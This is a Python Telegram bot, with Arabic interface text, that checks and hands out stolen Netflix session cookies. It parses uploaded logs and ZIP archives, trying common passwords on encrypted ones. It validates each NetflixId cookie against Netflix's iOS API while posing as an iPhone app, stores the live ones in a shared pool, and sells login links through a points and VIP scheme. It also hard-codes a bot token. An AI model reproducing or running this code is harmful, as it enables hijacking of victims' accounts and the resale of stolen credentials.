import telebot
import pyzipper
import os
import re
import sqlite3
import shutil
import urllib.parse
import time
import requests
import threading
import random
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from urllib3.exceptions import InsecureRequestWarning

# --- إعدادات البوت والتوكن ---
TOKEN = '8890151932:AAEMmm73E5r82FaSslWuRH96O8nSu-NBZ3o'
bot = telebot.TeleBot(TOKEN)

# 👑 إعدادات المطور الخاصة بك (فارس)
DEVELOPER_CHAT_ID = 8713916851
DEVELOPER_USERNAME = "farxxes"
CHANNEL_LINK = "https://t.me/farxxess"

# إعدادات السيرفرات العشوائية
api_hosts = [
    "https://nftokengen-7ik6.onrender.com",
    "https://netflixtokengenapi.onrender.com"
]

# تعطيل تحذيرات SSL
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

COMMON_PASSWORDS = ["123", "1234", "admin", "cookies", "netflix", "premium", "troxdrop"]
BASE_TEMP_DIR = "final_output_temp"
if not os.path.exists(BASE_TEMP_DIR):
    os.makedirs(BASE_TEMP_DIR)

active_scans = {}

# ====================================================
# ✅ نظام الحفظ الدائم بقاعدة بيانات SQLite بدلاً من JSON
# ====================================================
DB_DIR = "database"
if not os.path.exists(DB_DIR):
    os.makedirs(DB_DIR)

DB_FILE = os.path.join(DB_DIR, "bot_database.db")
db_lock = threading.Lock()

def db_execute(query, params=(), fetch=False, fetchall=False):
    with db_lock:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute(query, params)
        if fetch:
            res = cursor.fetchone()
        elif fetchall:
            res = cursor.fetchall()
        else:
            res = None
        conn.commit()
        conn.close()
        return res

def load_all_data():
    db_execute('''CREATE TABLE IF NOT EXISTS users (chat_id INTEGER PRIMARY KEY, points INTEGER, username TEXT, role TEXT)''')
    db_execute('''CREATE TABLE IF NOT EXISTS cookies (cookie TEXT PRIMARY KEY)''')
    db_execute('''CREATE TABLE IF NOT EXISTS history (cookie TEXT PRIMARY KEY)''')
    db_execute('''CREATE TABLE IF NOT EXISTS banned (chat_id INTEGER PRIMARY KEY)''')
    print("✅ تم تجهيز قاعدة بيانات SQLite بنجاح!")

# تحميل البيانات عند بدء التشغيل
load_all_data()
# ====================================================

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "modelType": "IPHONE8-1",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.client.appversion": "15.48.1",
    "accept-language": "en-US;q=1",
}

def check_ban(func):
    def wrapper(message, *args, **kwargs):
        try:
            chat_id = message.chat.id if hasattr(message, 'chat') else message.message.chat.id
        except Exception:
            chat_id = message.message.chat.id
        
        if db_execute("SELECT 1 FROM banned WHERE chat_id=?", (chat_id,), fetch=True):
            bot.send_message(chat_id, "❌ عذراً، تم حظرك من استخدام البوت من قبل الإدارة.")
            return
        return func(message, *args, **kwargs)
    return wrapper

def ensure_user(chat_id, username=""):
    if not db_execute("SELECT 1 FROM users WHERE chat_id=?", (chat_id,), fetch=True):
        db_execute("INSERT INTO users (chat_id, points, username, role) VALUES (?, ?, ?, ?)", (chat_id, 5, username, "MEMBER"))

def extract_clean_netflix_ids(text):
    cleaned_ids = []
    netscape_matches = re.findall(r"NetflixId\s+([^\s\n\r]+)", text)
    for val in netscape_matches:
        decoded = urllib.parse.unquote(val) if "%" in val else val
        if decoded not in cleaned_ids and len(decoded) > 20:
            cleaned_ids.append(decoded)
    standard_matches = re.findall(r"NetflixId=([^;\s\n`]+)", text)
    for val in standard_matches:
        decoded = urllib.parse.unquote(val) if "%" in val else val
        if decoded not in cleaned_ids and len(decoded) > 20:
            cleaned_ids.append(decoded)
    return cleaned_ids

def check_netflix_cookie_detailed(netflix_id):
    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        response = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=10, verify=False)
        if response.status_code == 200:
            data = response.json()
            value_data = data.get("value", {})
            account_info = value_data.get("account", {}).get("token", {}).get("default", {})
            token = account_info.get("token")
            expires = account_info.get("expires")
            if token:
                membership_status = value_data.get("membershipStatus", "UNKNOWN")
                is_on_hold = value_data.get("accountHold", False) or value_data.get("isInHoldStatus", False)
                geoblock_status = value_data.get("geoBlockStatus", {})
                if membership_status != "FORMER_MEMBER" and not is_on_hold and not geoblock_status.get("isBlocked", False):
                    return {"token": token, "expires": expires, "bypass": False}
        fallback_url = "https://www.netflix.com/YourAccount"
        res_fallback = requests.get(fallback_url, headers={"User-Agent": "Mozilla/5.0", "Cookie": f"NetflixId={netflix_id}"}, timeout=8, allow_redirects=False)
        if res_fallback.status_code in [200, 302] and "login" not in res_fallback.headers.get("Location", "").lower():
            return {"token": "BYPASS_VALID_OK", "expires": int(time.time()) + 2592000, "bypass": True}
        return None
    except Exception:
        return None

def auto_clean_pool_job():
    while True:
        time.sleep(43200)
        all_cookies = db_execute("SELECT cookie FROM cookies", fetchall=True)
        if all_cookies:
            for (cookie_val,) in all_cookies:
                if not check_netflix_cookie_detailed(cookie_val):
                    db_execute("DELETE FROM cookies WHERE cookie=?", (cookie_val,))

threading.Thread(target=auto_clean_pool_job, daemon=True).start()

def safe_send_message(chat_id, text, markup=None):
    while True:
        try:
            return bot.send_message(chat_id, text, reply_markup=markup, disable_web_page_preview=True, parse_mode="Markdown")
        except telebot.apihelper.ApiTelegramException as e:
            if e.error_code == 429:
                retry_after = int(re.search(r'retry after (\d+)', e.description).group(1)) if re.search(r'retry after (\d+)', e.description) else 5
                time.sleep(retry_after + 1)
            else:
                break
    return None

def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_name):
    ensure_user(chat_id)
    total_count = len(netflix_ids)
    active_scans[chat_id] = True
    clean_source_name = source_name.replace("_", "\\_").replace("*", "\\*").replace("`", "\\`").replace("[", "\\[")
    live_accounts_accumulator = []
    stop_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 إيقاف الفحص", callback_data=f"stop_scan_{chat_id}"))
    status = bot.send_message(chat_id, f"⏳ جاري فحص واستخراج الكوكيز...\n\n(تم العثور على {total_count} كوكيز وجاري المعالجة...)", reply_to_message_id=reply_to_message_id, reply_markup=stop_markup)
    live_count, dead_count, dup_count = 0, 0, 0
    
    for index, netflix_id in enumerate(netflix_ids, start=1):
        if not active_scans.get(chat_id, False):
            safe_send_message(chat_id, f"🛑 تم إلغاء الفحص!\n✅ شغال: {live_count} | ❌ ميت: {dead_count} | ✂️ مكرر: {dup_count}")
            return
        
        is_duplicate = db_execute("SELECT 1 FROM history WHERE cookie=?", (netflix_id,), fetch=True) is not None
        
        if index % 5 == 0 or index == total_count:
            try:
                bot.edit_message_text(f"⏳ جاري الفحص: ({index}/{total_count})\n✅ شغال: {live_count} | ❌ ميت: {dead_count} | ✂️ مكرر: {dup_count}", chat_id, status.message_id, reply_markup=stop_markup)
            except Exception:
                pass
                
        result = check_netflix_cookie_detailed(netflix_id)
        if result:
            if is_duplicate:
                dup_count += 1
            else:
                live_count += 1
                db_execute("INSERT OR IGNORE INTO history (cookie) VALUES (?)", (netflix_id,))
                db_execute("INSERT OR IGNORE INTO cookies (cookie) VALUES (?)", (netflix_id,))
                
            token = result["token"]
            expires = result["expires"]
            if isinstance(expires, int) and len(str(expires)) == 13:
                expires //= 1000
            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
            full_cookie_string = f"NetflixId={netflix_id}"
            direct_netflix_url = "https://www.netflix.com/" if result["bypass"] else f"https://netflix.com/?nftoken={token}"
            encoded_cookie = urllib.parse.quote(full_cookie_string)
            chosen_host = random.choice(api_hosts)
            bridge_login_url = f"{chosen_host}/nf/netflix?cookie={encoded_cookie}"
            dup_tag = " (مكرر شغال)" if is_duplicate else ""
            res_text = f"🌟 **PREMIUM ACCOUNT{dup_tag}** 🌟\n\n📁 المصدر: {clean_source_name}\n• انتهاء الفواتير: {date_str}\n\n🔗 الرابط المباشر:\n{direct_netflix_url}"
            txt_entry = f"Cookie: {full_cookie_string}\nURL: {direct_netflix_url}\n====================\n\n"
            live_accounts_accumulator.append(txt_entry)
            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("💻 PC Login", url=direct_netflix_url), InlineKeyboardButton("📱 Phone Login", url=bridge_login_url))
            safe_send_message(chat_id, res_text, markup)
            time.sleep(1.2)
        else:
            if is_duplicate:
                db_execute("DELETE FROM history WHERE cookie=?", (netflix_id,))
                db_execute("DELETE FROM cookies WHERE cookie=?", (netflix_id,))
            dead_count += 1
        time.sleep(0.1)
        
    active_scans.pop(chat_id, None)
    current_points = db_execute("SELECT points FROM users WHERE chat_id=?", (chat_id,), fetch=True)[0]
    safe_send_message(chat_id, f"📊 **اكتمل الفحص والتصفية!**\n\n✅ المضاف للمخزن الجديد: {live_count}\n❌ التالف: {dead_count}\n✂️ المكرر الشغال المرسل: {dup_count}\n\n🪙 رصيدك الحالي: {current_points} نقطة 🪙")
    if live_accounts_accumulator:
        send_txt_file(chat_id, live_accounts_accumulator, source_name)

def process_cookies_list_and_check(chat_id, netflix_ids, reply_to_message_id, source_name="Cookies_File.txt"):
    if not netflix_ids:
        safe_send_message(chat_id, "❌ لم يتم العثور على أي كوكيز صالحة للعمل.")
        return
    threading.Thread(target=_threaded_cookies_check, args=(chat_id, netflix_ids, reply_to_message_id, source_name), daemon=True).start()

def send_txt_file(chat_id, accounts_list, original_filename):
    try:
        clean_name = os.path.splitext(original_filename)[0]
        output_txt_path = os.path.join(BASE_TEMP_DIR, f"{clean_name}_LIVE.txt")
        with open(output_txt_path, 'w', encoding='utf-8') as f:
            for item in accounts_list:
                f.write(item)
        with open(output_txt_path, 'rb') as doc:
            bot.send_document(chat_id, doc, caption="📁 ملف الحسابات الشغالة المجمعة الخريجة من الفحص الحالي 🔥")
        if os.path.exists(output_txt_path):
            os.remove(output_txt_path)
    except Exception as e:
        print(e)

def generate_main_keyboard(user_id):
    user_data = db_execute("SELECT points, role FROM users WHERE chat_id=?", (user_id,), fetch=True)
    if user_data:
        points, role = user_data[0], user_data[1]
    else:
        points, role = 5, "MEMBER"

    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(InlineKeyboardButton("🔍 فحص (ملف/نص/رابط)", callback_data="menu_check"))
    if user_id == DEVELOPER_CHAT_ID:
        markup.add(InlineKeyboardButton("🎁 سحب رابط نتفلكس (صلاحية المطور ♾️)", callback_data="dispense_live_link"))
    elif role == "VIP":
        markup.add(InlineKeyboardButton("🎁 سحب رابط نتفلكس (وضع الـ VIP لا ينتهي 💎)", callback_data="dispense_live_link"))
    elif points > 0:
        markup.add(InlineKeyboardButton(f"🎁 سحب رابط نتفلكس (تكلفة: 1 نقطة) 🪙", callback_data="dispense_live_link"))
    else:
        markup.add(InlineKeyboardButton("📬 نفدت نقاطك! تواصل مع المطور فارس لشحن رصيدك 🫡", url=f"https://t.me/{DEVELOPER_USERNAME}"))
    markup.add(InlineKeyboardButton("📊 فحص المخزن والنقاط", callback_data="check_pool_status"))
    if user_id == DEVELOPER_CHAT_ID:
        markup.add(InlineKeyboardButton("👑 لوحة تحكم المطور السريّة", callback_data="open_admin_panel"))
    return markup

@bot.message_handler(commands=['start'])
@check_ban
def send_welcome(message):
    chat_id = message.chat.id
    is_new = db_execute("SELECT 1 FROM users WHERE chat_id=?", (chat_id,), fetch=True) is None
    ensure_user(chat_id, message.from_user.username or "")
    if is_new:
        welcome_txt = "مرحباً بك في بوت نتفلكس الذكي الخاص بفارس 😉🔥\n\n🎁 كهدية ترحيبية، **تم منحك 5 نقاط مجانية** للتجربة فوراً!"
    else:
        welcome_txt = "مرحباً بك مجدداً في لوحة التحكم الخاصة بك المحدثة 👇"
    bot.reply_to(message, welcome_txt, reply_markup=generate_main_keyboard(chat_id))

@bot.message_handler(commands=['id'])
@check_ban
def send_user_id(message):
    chat_id = message.chat.id
    user_first_name = message.from_user.first_name
    id_text = (f"👤 **معلومات الحساب الخاص بك:**\n\n• الاسم: **{user_first_name}**\n• الآيدي الخاص بك (ID): `{chat_id}`\n\n💡 _اضغط على الآيدي لنسخه تلقائياً وإرساله للمطور فارس إذا كنت تريد شحن نقاطك!_")
    bot.reply_to(message, id_text, parse_mode="Markdown")

@bot.message_handler(commands=['add'])
def add_points_command(message):
    if message.chat.id != DEVELOPER_CHAT_ID:
        return
    try:
        command_parts = message.text.split()
        if message.reply_to_message:
            target_id = message.reply_to_message.from_user.id
            amount = int(command_parts[1])
        else:
            amount = int(command_parts[1])
            target_id = int(command_parts[2])
        ensure_user(target_id)
        db_execute("UPDATE users SET points = points + ? WHERE chat_id=?", (amount, target_id))
        new_points = db_execute("SELECT points FROM users WHERE chat_id=?", (target_id,), fetch=True)[0]
        bot.reply_to(message, f"✅ تم إضافة **+{amount}** نقطة بنجاح.\n🪙 رصيده الآن: {new_points} نقطة", parse_mode="Markdown")
        try:
            bot.send_message(target_id, f"🎉 تم شحن رصيدك!\n\n🪙 تمت إضافة **+{amount}** نقطة إلى حسابك.\n💰 رصيدك الحالي: **{new_points} نقطة**", parse_mode="Markdown")
        except Exception:
            pass
    except Exception:
        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/add 10` أو رسالة عادية `/add 10 [الآيدي]`")

@bot.message_handler(commands=['setvip'])
def set_vip_command(message):
    if message.chat.id != DEVELOPER_CHAT_ID:
        return
    try:
        command_parts = message.text.split()
        target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(command_parts[1])
        ensure_user(target_id)
        db_execute("UPDATE users SET role = 'VIP' WHERE chat_id=?", (target_id,))
        bot.reply_to(message, f"👑 تم ترقية المستخدم `{target_id}` إلى رتبة **VIP** بنجاح! سحب مجاني للأبد.")
        try:
            bot.send_message(target_id, "🎊 مبروك! تمت ترقيتك إلى رتبة **VIP** 💎\nيمكنك الآن سحب حسابات نتفلكس بشكل مجاني وبلا حدود!", parse_mode="Markdown")
        except Exception:
            pass
    except Exception:
        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/setvip` أو عادياً `/setvip [الآيدي]`")

@bot.message_handler(commands=['ban'])
def ban_user_command(message):
    if message.chat.id != DEVELOPER_CHAT_ID:
        return
    try:
        command_parts = message.text.split()
        target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(command_parts[1])
        db_execute("INSERT OR IGNORE INTO banned (chat_id) VALUES (?)", (target_id,))
        bot.reply_to(message, f"🚫 تم حظر المستخدم `{target_id}` بنجاح.")
    except Exception:
        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/ban` أو عادياً `/ban [الآيدي]`")

@bot.message_handler(commands=['unban'])
def unban_user_command(message):
    if message.chat.id != DEVELOPER_CHAT_ID:
        return
    try:
        command_parts = message.text.split()
        target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(command_parts[1])
        db_execute("DELETE FROM banned WHERE chat_id=?", (target_id,))
        bot.reply_to(message, f"🟢 تم إلغاء حظر المستخدم `{target_id}` بنجاح.")
    except Exception:
        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/unban` أو عادياً `/unban [الآيدي]`")

def execute_dispense_logic(chat_id):
    ensure_user(chat_id)
    user_data = db_execute("SELECT points, role FROM users WHERE chat_id=?", (chat_id,), fetch=True)
    points, role = user_data[0], user_data[1]
    
    if chat_id != DEVELOPER_CHAT_ID and role != "VIP" and points <= 0:
        return {"status": "no_points"}
        
    count = db_execute("SELECT COUNT(*) FROM cookies", fetch=True)[0]
    if count == 0:
        return {"status": "empty", "message": "❌ المخزن فارغ حالياً! ارسل ملف كوكيز أولاً لتعبئته."}
        
    while True:
        cookie_row = db_execute("SELECT cookie FROM cookies LIMIT 1", fetch=True)
        if not cookie_row:
            break
        current_cookie = cookie_row[0]
        db_execute("DELETE FROM cookies WHERE cookie=?", (current_cookie,))
        
        fresh_result = check_netflix_cookie_detailed(current_cookie)
        if fresh_result:
            if chat_id != DEVELOPER_CHAT_ID and role != "VIP":
                db_execute("UPDATE users SET points = points - 1 WHERE chat_id=?", (chat_id,))
                points -= 1
            
            db_execute("INSERT INTO cookies (cookie) VALUES (?)", (current_cookie,))
            token = fresh_result["token"]
            expires = fresh_result["expires"]
            if isinstance(expires, int) and len(str(expires)) == 13:
                expires //= 1000
            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
            full_cookie_string = f"NetflixId={current_cookie}"
            direct_netflix_url = "https://www.netflix.com/" if fresh_result["bypass"] else f"https://netflix.com/?nftoken={token}"
            encoded_cookie = urllib.parse.quote(full_cookie_string)
            chosen_host = random.choice(api_hosts)
            bridge_login_url = f"{chosen_host}/nf/netflix?cookie={encoded_cookie}"
            short_id = current_cookie[:20]
            points_display = "♾️ وضع المطور" if chat_id == DEVELOPER_CHAT_ID else ("💎 رتبة VIP" if role == "VIP" else f"{points} نقطة")
            success_text = (f"🎉 **تفدّل رابط نتفلكس الطازج الخاص بك** 🎉\n\n🪙 رصيدك المتبقي الحالي: {points_display}.\n📅 **تاريخ الفواتير القادم:** {date_str}\n\n🔗 **رابط الدخول المباشر الموقت:**\n{direct_netflix_url}\n\n🤔 **هل اشتغل معك الرابط بدون مشاكل؟** يرجى التقييم بالأسفل 👇")
            user_markup = InlineKeyboardMarkup()
            user_markup.row_width = 2
            user_markup.add(InlineKeyboardButton("💻 دخول للكمبيوتر", url=direct_netflix_url), InlineKeyboardButton("📱 Phone Login", url=bridge_login_url))
            user_markup.add(InlineKeyboardButton("📺 كيف أستخدم الرابط؟", callback_data="ask_how_to_use"))
            user_markup.add(InlineKeyboardButton("✅ نعم، اشتغل تماماً", callback_data=f"fb_yes_{short_id}"), InlineKeyboardButton("❌ لا، لم يشتغل معي", callback_data=f"fb_no_{short_id}"))
            
            return {"status": "success", "text": success_text, "markup": user_markup}
    return {"status": "expired", "message": "❌ عذراً، انتهت صلاحية الكوكيز المتوفرة بالمخزن فجأة."}

@bot.callback_query_handler(func=lambda call: call.data == "ask_how_to_use")
@check_ban
def handle_ask_method(call):
    bot.answer_callback_query(call.id)
    chan_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔗 اضغط هنا لمشاهدة الطريقة", url=CHANNEL_LINK))
    bot.send_message(call.message.chat.id, "🤔 **هل تريد الطريقة؟**\n\nإذاً نعم، سوف أعطيك رابط قناتي متوفر فيها الشرح بالكامل بالتفصيل 👇", reply_markup=chan_markup)

@bot.callback_query_handler(func=lambda call: call.data == "dispense_live_link")
@check_ban
def dispense_account_on_button(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id, "⏳ جاري فحص الحساب وسحب الرابط...")
    response = execute_dispense_logic(chat_id)
    if response["status"] == "success":
        bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
    elif response["status"] == "no_points":
        bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً! يرجى التواصل مع فارس لشحن رصيدك.", reply_markup=generate_main_keyboard(chat_id))
    else:
        bot.send_message(chat_id, response["message"])

@bot.callback_query_handler(func=lambda call: call.data == "menu_check")
def menu_check_button(call):
    bot.edit_message_text("🔍 أرسل الملف (Txt/Zip) أو الكوكيز كنص الآن وسأفحصه فوراً!", call.message.chat.id, call.message.message_id)

@bot.callback_query_handler(func=lambda call: call.data == "check_pool_status")
@check_ban
def pool_status(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id)
    user_data = db_execute("SELECT points, role FROM users WHERE chat_id=?", (chat_id,), fetch=True)
    if user_data:
        points_val, role = user_data[0], user_data[1]
    else:
        points_val, role = 5, "MEMBER"
        
    points = "♾️ (أنت صاحب البوت)" if chat_id == DEVELOPER_CHAT_ID else ("💎 وضع VIP (مفتوح)" if role == "VIP" else f"{points_val} نقطة 🪙")
    pool_count = db_execute("SELECT COUNT(*) FROM cookies", fetch=True)[0]
    bot.send_message(chat_id, f"📦 **حالة الحساب والمخزن:**\n\n👤 رصيدك الحالي: **{points}**\n📦 إجمالي الكوكيز المتوفر بالمخزن المشترك: **{pool_count}** حساب جاهز.", reply_markup=generate_main_keyboard(chat_id))

@bot.callback_query_handler(func=lambda call: call.data.startswith('fb_'))
@check_ban
def handle_user_feedback(call):
    data_parts = call.data.split('_')
    action, short_id = data_parts[1], data_parts[2]
    user_info = call.from_user
    username = f"@{user_info.username}" if user_info.username else "لا يوجد"
    chat_id = call.message.chat.id
    
    # البحث عن الكوكيز المطابق في القاعدة
    target_cookie_row = db_execute("SELECT cookie FROM cookies WHERE cookie LIKE ?", (short_id + "%",), fetch=True)
    target_cookie = target_cookie_row[0] if target_cookie_row else None

    if action == "yes":
        bot.answer_callback_query(call.id, "شكراً على تقييمك! مشاهدة ممتعة 🍿🔥", show_alert=True)
        try:
            bot.edit_message_text("✅ **شكراً واستمتع! 🎬🍿**\n\nتم تأكيد عمل الرابط بنجاح، مشاهدة ممتعة!", chat_id, call.message.message_id, reply_markup=None)
        except Exception:
            pass
        if target_cookie:
            dev_log_text = f"👑 **سحب ناجح!** 👑\n👤 المستعمل: {user_info.first_name} ({username})\n🆔 الأيدي: `{user_info.id}`\n🍪 الكوكيز الفعال:\n`NetflixId={target_cookie}`"
            try:
                bot.send_message(DEVELOPER_CHAT_ID, dev_log_text, parse_mode="Markdown")
            except Exception:
                pass
    elif action == "no":
        if target_cookie:
            db_execute("DELETE FROM cookies WHERE cookie=?", (target_cookie,))
            bot.answer_callback_query(call.id, "⚠️ تم الإبلاغ وحذف الحساب التالف، جاري تعويضك فوراً...", show_alert=True)
            try:
                bot.send_message(DEVELOPER_CHAT_ID, f"❌ تم حذف حساب ميت أبلغ عنه المستخدم: {user_info.first_name}\n🍪 `NetflixId={target_cookie}`")
            except Exception:
                pass
        else:
            bot.answer_callback_query(call.id, "👌 تم تصفية هذا الحساب مسبقاً، جاري استخراج بديل لك...", show_alert=False)
        try:
            bot.edit_message_text("❌ تم حذف الرابط القديم لعدم عمله! جاري سحب حساب جديد لك فوراً وخصم 1 نقطة... ⏳", chat_id, call.message.message_id, reply_markup=None)
        except Exception:
            pass
        response = execute_dispense_logic(chat_id)
        if response["status"] == "success":
            bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
        elif response["status"] == "no_points":
            bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً! لا يمكن تعويضك بحساب جديد تلقائياً حتى تشحن.", reply_markup=generate_main_keyboard(chat_id))
        else:
            bot.send_message(chat_id, response["message"])

def open_admin_panel_msg(chat_id):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("📢 إرسال إذاعة جماعية (Broadcast)", callback_data="admin_broadcast"))
    markup.add(InlineKeyboardButton("🔄 تصفير الذاكرة والمكرر", callback_data="admin_clear_history"))
    
    users_count = db_execute("SELECT COUNT(*) FROM users", fetch=True)[0]
    cookies_count = db_execute("SELECT COUNT(*) FROM cookies", fetch=True)[0]
    banned_count = db_execute("SELECT COUNT(*) FROM banned", fetch=True)[0]
    history_count = db_execute("SELECT COUNT(*) FROM history", fetch=True)[0]
    
    stats_text = (f"👑 **مرحباً بك يا مطور البوت (فارس) في لوحتك السرية** 👑\n\n📊 **إحصائيات البوت اللحظية:**\n👥 إجمالي المستخدمين المسجلين: {users_count}\n📦 إجمالي الحسابات الشغالة بالمخزن: {cookies_count}\n🚫 إجمالي المحظورين: {banned_count}\n✂️ إجمالي الكوكيز في مانع التكرار: {history_count}")
    bot.send_message(chat_id, stats_text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "open_admin_panel")
def handle_admin_click(call):
    if call.message.chat.id == DEVELOPER_CHAT_ID:
        bot.answer_callback_query(call.id)
        open_admin_panel_msg(call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == "admin_broadcast")
def start_broadcast_process(call):
    bot.answer_callback_query(call.id)
    msg = bot.send_message(DEVELOPER_CHAT_ID, "📢 أرسل لي الآن الرسالة التي تريد إذاعتها لجميع مستخدمي البوت فوراً:")
    bot.register_next_step_handler(msg, process_broadcast_sending)

def process_broadcast_sending(message):
    if message.chat.id != DEVELOPER_CHAT_ID:
        return
    broadcast_text = message.text
    sent_count = 0
    bot.send_message(DEVELOPER_CHAT_ID, "⏳ جاري بدء الإذاعة ونشر الرسالة لجميع المشتركين...")
    users = db_execute("SELECT chat_id FROM users", fetchall=True)
    for (u_id,) in users:
        try:
            bot.send_message(u_id, f"📢 **إعلان من إدارة البوت:**\n\n{broadcast_text}", parse_mode="Markdown")
            sent_count += 1
            time.sleep(0.05)
        except Exception:
            pass
    bot.send_message(DEVELOPER_CHAT_ID, f"✅ تمت الإذاعة بنجاح! تم تسليم الرسالة إلى {sent_count} مستخدم نشط 🚀")

@bot.callback_query_handler(func=lambda call: call.data == "admin_clear_history")
def clear_history_action(call):
    db_execute("DELETE FROM history")
    bot.answer_callback_query(call.id, "✅ تم مسح تاريخ التكرار بنجاح لإتاحة فحص الملفات القديمة مجدداً.", show_alert=True)

def unzip_and_extract_ids(zip_path, extract_to, password=None):
    try:
        with pyzipper.AESZipFile(zip_path) as zip_ref:
            if password:
                zip_ref.setpassword(password.encode('utf-8'))
            zip_ref.extractall(path=extract_to)
        all_cookies = []
        for root, dirs, files in os.walk(extract_to):
            for file in files:
                if file.endswith('.txt') or file.endswith('.log'):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            for nid in extract_clean_netflix_ids(content):
                                if nid not in all_cookies:
                                    all_cookies.append(nid)
                    except Exception:
                        pass
        return True, all_cookies, None
    except RuntimeError as e:
        if 'encrypted' in str(e) or 'password' in str(e) or 'Bad password' in str(e):
            return False, [], "ENCRYPTED"
        return False, [], str(e)
    except Exception as e:
        return False, [], str(e)

def process_zip_entry(message, file_path, password=None, password_msg_id=None, original_name="Extracted_Archive.txt"):
    chat_id = message.chat.id
    user_work_dir = os.path.join(BASE_TEMP_DIR, f"{chat_id}_{int(time.time())}")
    if os.path.exists(user_work_dir):
        shutil.rmtree(user_work_dir)
    os.makedirs(user_work_dir)
    success, final_ids, error_type = unzip_and_extract_ids(file_path, user_work_dir, password)
    if password_msg_id:
        try:
            bot.delete_message(chat_id, password_msg_id)
        except Exception:
            pass
    if success:
        shutil.rmtree(user_work_dir)
        if os.path.exists(file_path):
            os.remove(file_path)
        process_cookies_list_and_check(chat_id, final_ids, message.message_id, source_name=original_name)
    elif error_type == "ENCRYPTED":
        if not password:
            for pwd in COMMON_PASSWORDS:
                sec_success, sec_ids, _ = unzip_and_extract_ids(file_path, user_work_dir, pwd)
                if sec_success:
                    shutil.rmtree(user_work_dir)
                    process_zip_entry(message, file_path, password=pwd, original_name=original_name)
                    return
            markup = InlineKeyboardMarkup()
            buttons = [InlineKeyboardButton(pwd, callback_data=f"fanal_{pwd}_{file_path}_{original_name}") for pwd in COMMON_PASSWORDS]
            markup.add(*buttons)
            bot.send_message(chat_id, "⚠️ الملف المضغوط محمي بكلمة مرور! اختر كلمة المرور الشائعة للمتابعة أو الفك الفوري:", reply_markup=markup)
    else:
        bot.send_message(chat_id, f"❌ حدث خطأ أثناء المعالجة: {error_type}")

@bot.message_handler(content_types=['document'])
@check_ban
def handle_incoming_document(message):
    file_name = message.document.file_name or "file.txt"
    file_name_lower = file_name.lower()
    if file_name_lower.endswith('.zip'):
        file_info = bot.get_file(message.document.file_id)
        local_path = os.path.join(BASE_TEMP_DIR, f"incoming_{message.chat.id}_{int(time.time())}.zip")
        with open(local_path, 'wb') as f:
            f.write(bot.download_file(file_info.file_path))
        process_zip_entry(message, local_path, original_name=file_name)
    elif file_name_lower.endswith('.txt') or file_name_lower.endswith('.log'):
        file_info = bot.get_file(message.document.file_id)
        file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        process_cookies_list_and_check(message.chat.id, extract_clean_netflix_ids(file_content), message.message_id, source_name=file_name)

@bot.callback_query_handler(func=lambda call: call.data.startswith('fanal_'))
@check_ban
def handle_inline_passwords(call):
    data_parts = call.data.split('_')
    chosen_password = data_parts[1]
    remaining_parts = data_parts[2:]
    original_name = remaining_parts[-1]
    file_path = "_".join(remaining_parts[:-1])
    if os.path.exists(file_path):
        process_zip_entry(call.message, file_path, password=chosen_password, password_msg_id=call.message.message_id, original_name=original_name)

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_scan_'))
def handle_stop_button(call):
    target_chat_id = int(call.data.split('_')[2])
    if target_chat_id in active_scans:
        active_scans[target_chat_id] = False
        bot.answer_callback_query(call.id, "🛑 جاري إيقاف الفحص...", show_alert=True)

if __name__ == "__main__":
    print("🚀 البوت يعمل الآن بنظام SQLite وكل الدوال الأصلية متوفرة!")
    bot.infinity_polling()
